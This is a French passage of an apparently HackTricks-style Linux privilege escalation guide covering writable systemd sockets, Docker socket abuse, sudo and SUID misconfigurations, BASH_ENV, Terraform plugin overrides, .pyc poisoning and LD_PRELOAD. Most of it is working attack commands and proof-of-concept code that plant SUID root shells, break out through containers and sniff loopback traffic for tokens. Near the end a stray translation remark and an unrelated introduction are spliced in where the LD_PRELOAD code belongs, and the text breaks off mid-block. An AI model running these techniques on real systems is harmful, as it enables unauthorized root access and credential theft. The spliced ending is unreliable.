Les Unix Domain Sockets (UDS) permettent la **communication entre processus** sur la même machine ou sur des machines différentes dans des modèles client-server. Ils utilisent des fichiers de descripteurs Unix standard pour la communication inter-ordinateur et sont configurés via des fichiers `.socket`.

Les sockets peuvent être configurés à l’aide de fichiers `.socket`.

**Apprenez-en plus sur les sockets avec `man systemd.socket`.** Dans ce fichier, plusieurs paramètres intéressants peuvent être configurés :

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ces options sont différentes mais un résumé est utilisé pour **indiquer où il va écouter** sur le socket (le chemin du fichier socket AF_UNIX, l’IPv4/6 et/ou le numéro de port à écouter, etc.)
- `Accept`: Prend un argument booléen. Si **true**, une **instance de service est lancée pour chaque connexion entrante** et seule la connexion socket lui est transmise. Si **false**, tous les sockets d’écoute eux-mêmes sont **transmis à l’unité de service démarrée**, et une seule unité de service est lancée pour toutes les connexions. Cette valeur est ignorée pour les sockets datagram et les FIFOs où une seule unité de service gère sans condition tout le trafic entrant. **La valeur par défaut est false**. Pour des raisons de performance, il est recommandé d’écrire les nouveaux daemons uniquement d’une manière adaptée à `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Prend une ou plusieurs lignes de commande, qui sont **exécutées avant** ou **après** la **création** et la liaison des **sockets**/FIFOs d’écoute, respectivement. Le premier token de la ligne de commande doit être un nom de fichier absolu, suivi des arguments du processus.
- `ExecStopPre`, `ExecStopPost`: **Commandes** supplémentaires qui sont **exécutées avant** ou **après** la fermeture et la suppression des **sockets**/FIFOs d’écoute, respectivement.
- `Service`: Spécifie le nom de l’unité de **service** à **activer** sur le **trafic entrant**. Ce réglage n’est autorisé que pour les sockets avec Accept=no. Par défaut, il s’agit du service qui porte le même nom que le socket (avec le suffixe remplacé). Dans la plupart des cas, il ne devrait pas être nécessaire d’utiliser cette option.

### Writable .socket files

Si vous trouvez un fichier `.socket` **inscriptible**, vous pouvez **ajouter** au début de la section `[Socket]` quelque chose comme : `ExecStartPre=/home/kali/sys/backdoor` et la backdoor sera exécutée avant que le socket soit créé. Par conséquent, vous devrez **probablement attendre que la machine redémarre.**\
_Notez que le système doit utiliser cette configuration de fichier socket, sinon la backdoor ne sera pas exécutée_

### Socket activation + writable unit path (create missing service)

Une autre mauvaise configuration à fort impact est :

- une unité socket avec `Accept=no` et `Service=<name>.service`
- l’unité de service référencée est absente
- un attaquant peut écrire dans `/etc/systemd/system` (ou un autre chemin de recherche des unités)

Dans ce cas, l’attaquant peut créer `<name>.service`, puis générer du trafic vers le socket afin que systemd charge et exécute le nouveau service en tant que root.

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Sockets inscriptibles

Si vous **identifiez un socket inscriptible** (_ici, nous parlons des Unix Sockets et non des fichiers de configuration `.socket`_), alors **vous pouvez communiquer** avec ce socket et peut-être exploiter une vulnérabilité.

### Énumérer les Unix Sockets
```bash
netstat -a -p --unix
```
### Connexion brute
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### Sockets HTTP

Note that there may be some **sockets listening for HTTP** requests (_je ne parle pas des fichiers .socket mais des fichiers agissant comme des unix sockets_). You can check this with:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Si le socket **répond avec une requête HTTP**, alors vous pouvez **communiquer** avec lui et peut-être **exploiter une vulnérabilité**.

### Writable Docker Socket

Le Docker socket, souvent trouvé à `/var/run/docker.sock`, est un fichier critique qui doit être sécurisé. Par défaut, il est inscriptible par l'utilisateur `root` et les membres du groupe `docker`. Disposer d’un accès en écriture à ce socket peut mener à une privilege escalation. Voici un aperçu de la manière dont cela peut être fait et des méthodes alternatives si le Docker CLI n'est pas disponible.

#### **Privilege Escalation with Docker CLI**

Si vous avez un accès en écriture au Docker socket, vous pouvez élever vos privilèges en utilisant les commandes suivantes :
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ces commandes vous permettent d’exécuter un container avec un accès au niveau root au système de fichiers de l’hôte.

#### **Using Docker API Directly**

Dans les cas où la CLI Docker n’est pas disponible, le socket Docker peut quand même être manipulé en utilisant l’API Docker et des commandes `curl`.

1.  **List Docker Images:** Récupérer la liste des images disponibles.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Envoyer une requête pour créer un container qui monte le répertoire racine du système de l’hôte.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Démarrer le nouveau container créé :

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Utiliser `socat` pour établir une connexion au container, permettant l’exécution de commandes à l’intérieur.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Après avoir configuré la connexion `socat`, vous pouvez exécuter des commandes directement dans le container avec un accès au niveau root au système de fichiers de l’hôte.

### Others

Notez que si vous avez des permissions d’écriture sur le socket docker parce que vous êtes **dans le groupe `docker`**, vous avez [**plus de moyens d’escalader les privilèges**](interesting-groups-linux-pe/index.html#docker-group). Si l’[**API docker écoute sur un port** vous pouvez aussi le compromettre](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Consultez **plus de moyens de sortir des containers ou d’abuser des runtimes de container pour escalader les privilèges** dans :

{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Si vous constatez que vous pouvez utiliser la commande **`ctr`**, lisez la page suivante, car vous pourriez être en mesure d’en abuser pour escalader les privilèges :

{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Si vous constatez que vous pouvez utiliser la commande **`runc`**, lisez la page suivante, car vous pourriez être en mesure d’en abuser pour escalader les privilèges :

{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus est un système sophistiqué de **communication inter-processus (IPC)** qui permet aux applications d’interagir efficacement et de partager des données. Conçu pour les systèmes Linux modernes, il offre un framework robuste pour différentes formes de communication entre applications.

Le système est polyvalent et prend en charge un IPC de base qui améliore l’échange de données entre processus, rappelant des **UNIX domain sockets améliorés**. De plus, il facilite la diffusion d’événements ou de signaux, favorisant une intégration fluide entre les composants du système. Par exemple, un signal d’un daemon Bluetooth concernant un appel entrant peut amener un lecteur de musique à se mettre en sourdine, améliorant l’expérience utilisateur. En outre, D-Bus prend en charge un système d’objets distants, simplifiant les demandes de service et les invocations de méthodes entre applications, et rationalisant des processus qui étaient traditionnellement complexes.

D-Bus fonctionne selon un modèle **allow/deny**, gérant les permissions des messages (appels de méthode, émissions de signaux, etc.) en fonction de l’effet cumulatif des règles de policy correspondantes. Ces policies spécifient les interactions avec le bus, pouvant permettre une escalade de privilèges via l’exploitation de ces permissions.

Un exemple d’une telle policy dans `/etc/dbus-1/system.d/wpa_supplicant.conf` est fourni, détaillant les permissions pour l’utilisateur root d’être propriétaire, d’envoyer et de recevoir des messages de `fi.w1.wpa_supplicant1`.

Les policies sans utilisateur ou groupe spécifié s’appliquent universellement, tandis que les policies du contexte "default" s’appliquent à tout ce qui n’est pas couvert par d’autres policies spécifiques.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Apprenez comment énumérer et exploiter une communication D-Bus ici :**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Réseau**

C'est toujours intéressant d'énumérer le réseau et de déterminer la position de la machine.

### Énumération générique
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Tri rapide du filtrage sortant

Si l'hôte peut exécuter des commandes mais que les callbacks échouent, séparez rapidement le filtrage DNS, transport, proxy et route :
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Ports ouverts

Vérifiez toujours les services réseau en cours d’exécution sur la machine avec lesquels vous n’avez pas pu interagir avant d’y accéder :
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Classifiez les listeners par cible de bind :

- `0.0.0.0` / `[::]` : exposés sur toutes les interfaces locales.
- `127.0.0.1` / `::1` : local-only (bons candidats tunnel/forward).
- IP internes spécifiques (par ex. `10.x`, `172.16/12`, `192.168.x`, `fe80::`) : généralement accessibles uniquement depuis les segments internes.

### Flux de triage des services local-only

Quand vous compromettez un host, les services liés à `127.0.0.1` deviennent souvent accessibles pour la première fois depuis votre shell. Un flux local rapide est :
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS comme scanner réseau (mode réseau uniquement)

En plus des vérifications PE locales, linPEAS peut s’exécuter comme un scanner réseau ciblé. Il utilise les binaires disponibles dans `$PATH` (généralement `fping`, `ping`, `nc`, `ncat`) et n’installe aucun outil.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Si vous passez `-d`, `-p` ou `-i` sans `-t`, linPEAS se comporte comme un simple network scanner (en ignorant le reste des vérifications de privilege-escalation).

### Sniffing

Vérifiez si vous pouvez sniffer le trafic. Si oui, vous pourriez récupérer certains credentials.
```
timeout 1 tcpdump
```
Vérifications pratiques rapides :
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) est particulièrement utile en post-exploitation, car de nombreux services internes exposent des tokens/cookies/credentials là-bas :
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Capture maintenant, parse plus tard :
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Utilisateurs

### Énumération générique

Vérifiez **qui** vous êtes, quels **privilèges** vous avez, quels **utilisateurs** sont dans les systèmes, lesquels peuvent **login** et lesquels ont des **privilèges root** :
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Certaines versions de Linux ont été affectées par un bug qui permet aux utilisateurs avec **UID > INT_MAX** d’escalader leurs privilèges. Plus d’informations : [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) et [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploitez-le** en utilisant : **`systemd-run -t /bin/bash`**

### Groups

Vérifiez si vous êtes **membre d’un groupe** qui pourrait vous accorder des privilèges root :


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Vérifiez si quelque chose d’intéressant se trouve dans le clipboard (si possible)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politique de mot de passe
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Mots de passe connus

Si vous **connaissez un mot de passe** de l’environnement, **essayez de vous connecter avec chaque utilisateur** en utilisant ce mot de passe.

### Su Brute

Si cela ne vous dérange pas de faire beaucoup de bruit et que les binaires `su` et `timeout` sont présents sur l’ordinateur, vous pouvez essayer de bruteforcer l’utilisateur avec [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) avec le paramètre `-a` essaie aussi de bruteforcer les utilisateurs.

## Abus de PATH inscriptible

### $PATH

Si vous trouvez que vous pouvez **écrire dans un dossier du $PATH**, vous pourriez être en mesure d’escalader les privilèges en **créant une backdoor dans le dossier inscriptible** avec le nom d’une commande qui va être exécutée par un autre utilisateur (root idéalement) et qui **n’est pas chargée depuis un dossier situé avant** votre dossier inscriptible dans le $PATH.

### SUDO and SUID

Vous pourriez être autorisé à exécuter une commande avec sudo ou elle pourrait avoir le bit suid. Vérifiez-le en utilisant :
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Certains **commandes inattendues vous permettent de lire et/ou écrire des fichiers, voire d’exécuter une commande.** Par exemple :
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

La configuration de sudo peut permettre à un utilisateur d’exécuter une commande avec les privilèges d’un autre utilisateur sans connaître le mot de passe.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Dans cet exemple, l'utilisateur `demo` peut exécuter `vim` en tant que `root`, il est désormais trivial d'obtenir un shell en ajoutant une clé ssh dans le répertoire root ou en appelant `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Cette directive permet à l'utilisateur de **définir une variable d'environnement** lors de l'exécution de quelque chose :
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Cet exemple, **basé sur la machine HTB Admirer**, était **vulnérable** au **PYTHONPATH hijacking** pour charger une bibliothèque python arbitraire lors de l’exécution du script en tant que root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### `__pycache__` / `.pyc` poisoning writable dans les imports Python autorisés par sudo

Si un **script Python autorisé par sudo** importe un module dont le répertoire du package contient un **`__pycache__` writable**, vous pouvez peut-être remplacer le `.pyc` mis en cache et obtenir une exécution de code en tant qu’utilisateur privilégié lors du prochain import.

- Pourquoi cela fonctionne :
- CPython stocke les caches de bytecode dans `__pycache__/module.cpython-<ver>.pyc`.
- L’interpréteur valide l’**en-tête** (magic + métadonnées timestamp/hash liées au source), puis exécute l’objet code marshalé stocké après cet en-tête.
- Si vous pouvez **supprimer et recréer** le fichier mis en cache parce que le répertoire est writable, un `.pyc` appartenant à root mais non writable peut quand même être remplacé.
- Parcours typique :
- `sudo -l` montre un script Python ou un wrapper que vous pouvez exécuter en tant que root.
- Ce script importe un module local depuis `/opt/app/`, `/usr/local/lib/...`, etc.
- Le répertoire `__pycache__` du module importé est writable par votre utilisateur ou par tout le monde.

Enumeration rapide :
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
Si vous pouvez inspecter le script privilégié, identifiez les modules importés et leur chemin de cache :
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Workflow d’abus :

1. Exécutez une fois le script autorisé par sudo afin que Python crée le fichier cache légitime s’il n’existe pas déjà.
2. Lisez les 16 premiers octets du `.pyc` légitime et réutilisez-les dans le fichier empoisonné.
3. Compilez un code object de payload, faites `marshal.dumps(...)`, supprimez le fichier cache original, puis recréez-le avec l’en-tête original plus votre bytecode malveillant.
4. Relancez le script autorisé par sudo afin que l’import exécute votre payload en tant que root.

Notes importantes :

- La réutilisation de l’en-tête original est essentielle, car Python vérifie les métadonnées du cache par rapport au fichier source, et non si le corps du bytecode correspond réellement à la source.
- C’est particulièrement utile lorsque le fichier source appartient à root et n’est pas inscriptible, mais que le répertoire `__pycache__` contenant l’est.
- L’attaque échoue si le processus privilégié utilise `PYTHONDONTWRITEBYTECODE=1`, importe depuis un emplacement avec des permissions sûres, ou supprime l’accès en écriture à tous les répertoires dans le chemin d’import.

Forme minimale de preuve de concept :
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening :

- Assurez-vous qu’aucun répertoire dans le chemin d’import Python privilégié n’est inscriptible par des utilisateurs à privilèges faibles, y compris `__pycache__`.
- Pour les exécutions privilégiées, envisagez `PYTHONDONTWRITEBYTECODE=1` et des vérifications périodiques de répertoires `__pycache__` inscriptibles inattendus.
- Traitez les modules Python locaux inscriptibles et les répertoires de cache inscriptibles de la même manière que vous traiteriez des scripts shell inscriptibles ou des bibliothèques partagées exécutées par root.

### BASH_ENV préservé via sudo env_keep → root shell

Si sudoers préserve `BASH_ENV` (par ex. `Defaults env_keep+="ENV BASH_ENV"`), vous pouvez exploiter le comportement de démarrage non interactif de Bash pour exécuter du code arbitraire en tant que root lors de l’appel d’une commande autorisée.

- Pourquoi cela fonctionne : pour les shells non interactifs, Bash évalue `$BASH_ENV` et source ce fichier avant d’exécuter le script cible. De nombreuses règles sudo autorisent l’exécution d’un script ou d’un wrapper shell. Si `BASH_ENV` est préservé par sudo, votre fichier est sourcé avec les privilèges root.

- Requirements :
- Une règle sudo que vous pouvez exécuter (n’importe quelle cible qui invoque `/bin/bash` de manière non interactive, ou n’importe quel script bash).
- `BASH_ENV` présent dans `env_keep` (vérifiez avec `sudo -l`).

- PoC :
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Renforcement :
- Supprimez `BASH_ENV` (et `ENV`) de `env_keep`, privilégiez `env_reset`.
- Évitez les shell wrappers pour les commandes autorisées par sudo ; utilisez des binaries minimaux.
- Envisagez la journalisation I/O de sudo et des alertes lorsque des variables d’environnement préservées sont utilisées.

### Terraform via sudo avec HOME préservé (!env_reset)

Si sudo laisse l’environnement intact (`!env_reset`) tout en autorisant `terraform apply`, `$HOME` reste celui de l’utilisateur appelant. Terraform charge donc **$HOME/.terraformrc** en tant que root et respecte `provider_installation.dev_overrides`.

- Pointez le provider requis vers un répertoire inscriptible et déposez un plugin malveillant nommé d’après le provider (par exemple, `terraform-provider-examples`) :
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform échouera au niveau du handshake du plugin Go, mais exécutera le payload en root avant de mourir, laissant derrière lui un shell SUID.

### TF_VAR overrides + symlink validation bypass

Les variables Terraform peuvent être fournies via des variables d’environnement `TF_VAR_<name>`, qui persistent lorsque sudo préserve l’environnement. Des validations faibles comme `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` peuvent être contournées avec des symlinks :
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform résout le symlink et copie le vrai `/root/root.txt` vers une destination lisible par l'attaquant. La même approche peut être utilisée pour **write** dans des chemins privilégiés en précréant des symlinks de destination (par ex., en pointant le chemin de destination du provider dans `/etc/cron.d/`).

### requiretty / !requiretty

Sur certaines anciennes distributions, sudo peut être configuré avec `requiretty`, ce qui force sudo à s’exécuter uniquement depuis un TTY interactif. Si `!requiretty` est défini (ou si l’option est absente), sudo peut être exécuté depuis des contextes non interactifs comme des reverse shells, des cron jobs ou des scripts.
```bash
Defaults !requiretty
```
Ce n’est pas une vulnérabilité directe en soi, mais cela élargit les situations où les règles `sudo` peuvent être abusées sans avoir besoin d’un PTY complet.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Si `sudo -l` montre `env_keep+=PATH` ou un `secure_path` contenant des entrées inscriptibles par l’attaquant (par ex. `/home/<user>/bin`), toute commande relative à l’intérieur de la cible autorisée par `sudo` peut être shadowed.

- Requirements: une règle `sudo` (souvent `NOPASSWD`) qui exécute un script/binaire appelant des commandes sans chemins absolus (`free`, `df`, `ps`, etc.) et une entrée PATH inscriptible qui est recherchée en premier.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Contournement des chemins d’exécution de Sudo
**Jump** pour lire d’autres fichiers ou utiliser des **symlinks**. Par exemple dans le fichier sudoers : _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Si un **wildcard** est utilisé (\*), c’est encore plus facile :
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contre-mesures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Commande sudo/binaire SUID sans chemin de commande

Si la **permission sudo** est donnée à une seule commande **sans préciser le chemin** : _hacker10 ALL= (root) less_ vous pouvez l’exploiter en modifiant la variable PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Cette technique peut aussi être utilisée si un binaire **suid** **exécute une autre commande sans en spécifier le chemin (vérifiez toujours avec** _**strings**_ **le contenu d’un binaire SUID étrange)**.

[Exemples de payloads à exécuter.](payloads-to-execute.md)

### SUID binary with command path

Si le binaire **suid** **exécute une autre commande en spécifiant le chemin**, alors vous pouvez essayer d’**exporter une fonction** nommée comme la commande appelée par le fichier suid.

Par exemple, si un binaire suid appelle _**/usr/sbin/service apache2 start**_, vous devez essayer de créer la fonction et de l’exporter :
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Puis, lorsque vous appelez le binaire SUID, cette fonction sera exécutée

### Script inscriptible exécuté par un wrapper SUID

Une mauvaise configuration courante d’une application personnalisée est un wrapper de binaire SUID détenu par root qui exécute un script, tandis que le script lui-même est inscriptible par des utilisateurs sans privilèges.

Schéma typique :
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Si `/usr/local/bin/backup.sh` est inscriptible, vous pouvez ajouter des commandes payload puis exécuter le wrapper SUID :
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Vérifications rapides :
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Cette voie d’attaque est particulièrement courante dans les wrappers de "maintenance"/"backup" livrés dans `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

La variable d’environnement **LD_PRELOAD** est utilisée pour spécifier une ou plusieurs bibliothèques partagées (.so files) à charger par le loader avant toutes les autres, y compris la bibliothèque C standard (`libc.so`). Ce processus est appelé preloading d’une bibliothèque.

Cependant, pour maintenir la sécurité du système et empêcher l’exploitation de cette fonctionnalité, en particulier avec des exécutables **suid/sgid**, le système impose certaines conditions :

- Le loader ignore **LD_PRELOAD** pour les exécutables dont le real user ID (_ruid_) ne correspond pas au effective user ID (_euid_).
- Pour les exécutables suid/sgid, seules les bibliothèques situées dans les chemins standard et elles-mêmes suid/sgid sont preloaded.

Une élévation de privilèges peut se produire si vous pouvez exécuter des commandes avec `sudo` et que la sortie de `sudo -l` inclut l’instruction **env_keep+=LD_PRELOAD**. Cette configuration permet à la variable d’environnement **LD_PRELOAD** de persister et d’être prise en compte même lorsque des commandes sont exécutées avec `sudo`, ce qui peut potentiellement conduire à l’exécution de code arbitraire avec des privilèges élevés.
```
Defaults        env_keep += LD_PRELOAD
```
Je ne peux pas écrire directement dans `/tmp/pe.c` depuis ici, mais voici la traduction prête à être enregistrée dans ce fichier :

```md
# Privilege Escalation

La **Privilege Escalation** est le processus qui consiste à obtenir des permissions plus élevées sur une machine compromise. Dans Linux, cela signifie généralement passer d'un utilisateur normal à `root`.

Il existe plusieurs façons d'effectuer une **Privilege Escalation** sur Linux. Certaines des techniques les plus courantes sont :

- Mauvaises configurations de `sudo`
- Fichiers `SUID`/`SGID`
- Services ou binaires vulnérables
- Secrets ou identifiants exposés
- Exploiter des `kernel` vulnerabilities

Cette section rassemble des méthodes, des vérifications et des notes utiles pour identifier et exploiter des chemins d'élévation de privilèges sur des systèmes Linux.
```
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Puis **compilez-le** en utilisant :
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Enfin, **escaladez les privilèges** en exécutant
```bash
